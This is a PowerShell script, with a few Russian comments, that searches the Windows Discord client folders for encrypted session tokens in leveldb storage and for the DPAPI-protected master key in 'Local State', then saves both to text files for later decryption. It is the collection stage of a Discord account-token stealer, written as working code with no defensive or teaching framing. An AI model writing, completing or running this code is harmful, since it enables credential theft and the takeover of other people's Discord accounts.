$ErrorActionPreference = "Continue"

function Find-EncryptedTokens {
    param($discord_path)
    
    $leveldb_path = "$discord_path\Local Storage\leveldb"
    if (!(Test-Path $leveldb_path)) { return @() }
    
    $tokens = @()
    $files = Get-ChildItem $leveldb_path -Include *.log,*.ldb -Recurse -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        try {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match 'dQw4w9WgXcQ:([^"]+)') {
                $tokens += $matches[1]
            }
        } catch {}
    }
    
    return $tokens
}

function Get-EncryptedMasterKey {
    param($discord_path)
    
    try {
        $local_state = "$discord_path\Local State"
        if (!(Test-Path $local_state)) { return $null }
        
        $json = Get-Content $local_state -Raw | ConvertFrom-Json
        if (!$json.os_crypt.encrypted_key) { return $null }
        
        $encrypted_key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        
        if ($encrypted_key.Length -gt 5) {
            $prefix = [System.Text.Encoding]::ASCII.GetString($encrypted_key[0..4])
            if ($prefix -eq "DPAPI") {
                $encrypted_key = $encrypted_key[5..($encrypted_key.Length-1)]
            }
        }
        
        return $encrypted_key
    } catch {
        return $null
    }
}

$paths = @(
    "$env:APPDATA\discord",
    "$env:APPDATA\discordcanary",
    "$env:APPDATA\discordptb",
    "$env:APPDATA\discorddevelopment",
    "$env:LOCALAPPDATA\discord",
    "$env:LOCALAPPDATA\DiscordCanary",
    "$env:LOCALAPPDATA\DiscordPTB",
    "$env:LOCALAPPDATA\DiscordDevelopment"
)

$discord_paths = @()
foreach ($path in $paths) {
    if (Test-Path $path) {
        $discord_paths += $path
    }
}

if ($discord_paths.Count -eq 0) { exit 1 }

$all_encrypted_tokens = @()
$encrypted_master_key = $null

foreach ($discord_path in $discord_paths) {
    if (!$encrypted_master_key) {
        $encrypted_master_key = Get-EncryptedMasterKey -discord_path $discord_path
        if ($encrypted_master_key) {
            # Сохраняем зашифрованный мастер-ключ в Base64 (БЕЗ BOM)
            $encrypted_master_key_base64 = [Convert]::ToBase64String($encrypted_master_key)
            # Используем Out-File с параметрами для предотвращения BOM
            $encrypted_master_key_base64 | Out-File -FilePath "encrypted_master_key.txt" -Encoding ASCII -NoNewline
        }
    }
    
    $tokens = Find-EncryptedTokens -discord_path $discord_path
    if ($tokens) {
        $all_encrypted_tokens += $tokens
    }
}

if ($all_encrypted_tokens.Count -eq 0) { exit 1 }
if (!$encrypted_master_key) { exit 1 }

# Сохраняем токены (БЕЗ BOM)
$all_encrypted_tokens | Out-File -FilePath "encrypted_tokens.txt" -Encoding ASCII
